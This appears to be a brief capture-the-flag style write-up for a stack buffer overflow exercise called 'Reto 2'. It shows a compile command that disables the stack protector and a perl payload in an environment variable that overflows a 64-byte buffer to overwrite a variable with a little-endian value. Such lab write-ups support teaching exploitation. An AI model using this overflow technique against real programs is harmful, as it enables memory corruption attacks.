## Reto 2

### Compilation:

      gcc reto2.c -o reto2 -fno-stack-protector -m32

### Solution:


We must configure the environment variable with the input value, in this case 
we must fill in the vector with 64 characters and what we write will be the
value of the variable to be modified.


As in reto 1 the value was spent as little endian:

      export GREENIE=$(perl -e 'print "a"x64 . "\x0a\x0d\x0a\x0d"')
